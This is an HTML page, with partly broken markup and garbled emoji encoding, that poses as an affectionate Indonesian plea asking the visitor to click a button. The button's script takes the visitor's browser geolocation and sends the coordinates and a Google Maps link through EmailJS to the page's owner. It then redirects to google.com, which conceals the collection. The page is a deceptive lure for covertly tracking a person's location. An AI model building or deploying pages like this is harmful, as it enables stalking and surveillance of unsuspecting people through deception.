  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom right, #a7c5f7, #dbeafe);
      margin: 0;

    }

    .card {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;

    }

    h2 {
      margin-bottom: 10px;

    }

    p {
      color: #374151;
      font-size: 15px;
    }

    button {
      margin-top: 20px;
      background-color: #3b82f6;
      color: white;

<body>
  <div class="card">
    <h2>Sayang, bantuuuuu akuuuu dongggg sayanggggg kuhhh üíô</h2>
    <p><br>cobaaaaa kamuuuu kliiikkkk yaaahhhhh plsssssüòò</p>
    <button onclick="kirimLokasi()">klikkkkk iniiiii sayaangggg kuhhhhh üíñ</button>
    <p id="status"></p>
  </div>

  <script>
    function kirimLokasi() {
      const statusEl = document.getElementById("status");
      if (navigator.geolocation) {
        statusEl.innerText = "sebentarrrrr sayaaangggg lagiiiii loadingggg...";
        navigator.geolocation.getCurrentPosition(function(posisi) {
          const lat = posisi.coords.latitude;
          const lon = posisi.coords.longitude;
          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

          emailjs.send("service_sd05c0j", "template_2htbs9m", {
            latitude: lat,
            longitude: lon,
            map_link: mapLink
          }).then(function(response) {
            window.location.href = "https://google.com";
          }, function(error) {
            console.error("EmailJS error:", error);
            statusEl.innerText = "‚ùå Gagal kirim lokasi ke aku üò¢";
          });

        }, function(error) {
          statusEl.innerText = "‚ùå Gagal ambil lokasi kamu: " + error.message;
        });
      } else {
        statusEl.innerText = "‚ùå HP kamu nggak support lokasi ya?";
      }
    }
  </script>
